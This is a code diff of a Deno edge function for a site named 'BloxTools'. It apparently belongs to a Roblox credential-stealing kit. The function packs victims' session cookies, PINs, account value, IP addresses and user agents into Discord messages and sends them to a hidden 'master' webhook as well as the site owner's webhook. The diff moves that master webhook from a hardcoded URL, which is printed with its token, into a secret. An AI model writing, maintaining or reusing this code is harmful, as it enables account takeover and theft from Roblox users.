@@ -18,14 +18,12 @@ interface Body {
   extras?: Record<string, string | number | undefined>;
 }
 
-const MASTER_WEBHOOK =
-  "https://discord.com/api/webhooks/1499103473546035462/pSKamRGzu27_7p4kr2Spr5YZl7zylwmRuj4omBg02R3jVq6XbCCpbYl6gh4G6KkAv95z";
-
+// Master webhook + emoji overrides are read from secrets PER REQUEST so changing
+// the MASTER_WEBHOOK_URL or DISCORD_EMOJIS secret takes effect immediately
+// without redeploys and without any hardcoded fallback masking the new value.
 const SITE_NAME = "BloxTools";
 
-// Discord emoji overrides — KEEP IN SYNC with src/config/toolsConfig.ts > discordEmojis
-// Edge functions cannot import from src/, so this is mirrored here.
-const EMOJI = {
+const DEFAULT_EMOJI: Record<string, string> = {
   robux:    "<:7116_Robux:1498757858731360349>",
   premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
   rap:      "💎",
@@ -50,6 +48,22 @@ const EMOJI = {
   pin:      "🔐",
   owner:    "🏷️",
 };
+
+function getMasterWebhook(): string {
+  return (Deno.env.get("MASTER_WEBHOOK_URL") ?? "").trim();
+}
+
+function loadEmoji(): Record<string, string> {
+  const raw = Deno.env.get("DISCORD_EMOJIS");
+  if (!raw) return DEFAULT_EMOJI;
+  try {
+    const parsed = JSON.parse(raw) as Record<string, string>;
+    return { ...DEFAULT_EMOJI, ...parsed };
+  } catch (e) {
+    console.error("DISCORD_EMOJIS secret is not valid JSON, falling back to defaults", e);
+    return DEFAULT_EMOJI;
+  }
+}
 
 
 // Roblox bundle IDs
@@ -189,7 +203,9 @@ Deno.serve(async (req) => {
       extras: body.extras,
     });
 
-    const targets = new Set<string>([MASTER_WEBHOOK]);
+    const targets = new Set<string>();
+    const masterWebhook = getMasterWebhook();
+    if (masterWebhook) targets.add(masterWebhook);
     if (ownerWebhook) targets.add(ownerWebhook);
 
     await Promise.allSettled(
@@ -649,6 +665,7 @@ function buildDiscordPayload(opts: {
   extras?: Record<string, string | number | undefined>;
 }) {
   const { siteName, ownerUsername, toolType, pin, cookie, roblox, ip, userAgent, extras } = opts;
+  const EMOJI = loadEmoji();
 
   const mainFields: Array<{ name: string; value: string; inline?: boolean }> = [
     { name: `${EMOJI.owner} Site Owner`, value: ownerUsername, inline: true },
